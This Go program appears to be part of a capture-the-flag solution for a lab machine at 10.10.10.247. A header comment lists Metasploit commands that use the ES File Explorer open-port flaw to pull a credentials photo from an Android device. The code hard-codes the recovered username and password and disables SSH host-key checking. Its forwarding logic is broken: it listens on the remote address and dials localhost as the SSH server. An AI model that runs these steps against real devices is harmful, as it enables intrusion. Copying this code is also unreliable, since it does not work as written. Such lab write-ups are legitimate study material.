package main

import (
	"flag"
	"io"
	"log"
	"net"

	"golang.org/x/crypto/ssh"
)

/*
 *  How to find credentials
 *
 *  auxiliary(scanner/http/es_file_explorer_open_port)
 *  set action GETFILE
 *  set actionitem /storage/emulated/0/DCIM/creds.jpg
 *  run
 *
 *  Open file in an image viewer to see the credentials written on paper
 */

// credentials gathered via steps above
var (
	username         = flag.String("u", "kristi", "username")
	password         = flag.String("p", "Kr1sT!5h@Rp3xPl0r3!", "password")
	serverAddrString = flag.String("h", "10.10.10.247:2222", "host:port")
	localAddr        = "localhost:5555"
)

func forward(localConn net.Conn, config *ssh.ClientConfig) {
	// Setup sshClientConn (type *ssh.ClientConn)
	sshClientConn, err := ssh.Dial("tcp", localAddr, config)
	if err != nil {
		log.Fatalf("ssh.Dial failed: %s", err)
	}

	// Setup sshConn (type net.Conn)
	sshConn, err := sshClientConn.Dial("tcp", localAddr)

	// Copy localConn.Reader to sshConn.Writer
	go func() {
		_, err = io.Copy(sshConn, localConn)
		if err != nil {
			log.Fatalf("io.Copy failed: %v", err)
		}
	}()

	// Copy sshConn.Reader to localConn.Writer
	go func() {
		_, err = io.Copy(localConn, sshConn)
		if err != nil {
			log.Fatalf("io.Copy failed: %v", err)
		}
	}()
}

func main() {
	flag.Parse()

	// Setup SSH config (type *ssh.ClientConfig)
	config := &ssh.ClientConfig{
		User:            *username,
		HostKeyCallback: ssh.InsecureIgnoreHostKey(),
		Auth: []ssh.AuthMethod{
			ssh.Password(*password),
		},
	}

	// Setup localListener (type net.Listener)
	localListener, err := net.Listen("tcp", *serverAddrString)
	if err != nil {
		log.Fatalf("net.Listen failed: %v", err)
	}

	for {
		// Setup localConn (type net.Conn)
		log.Print("waiting for connection...")

		localConn, err := localListener.Accept()
		if err != nil {
			log.Fatalf("listen.Accept failed: %v", err)
		}

		go forward(localConn, config)
		log.Print("connected")
	}
}
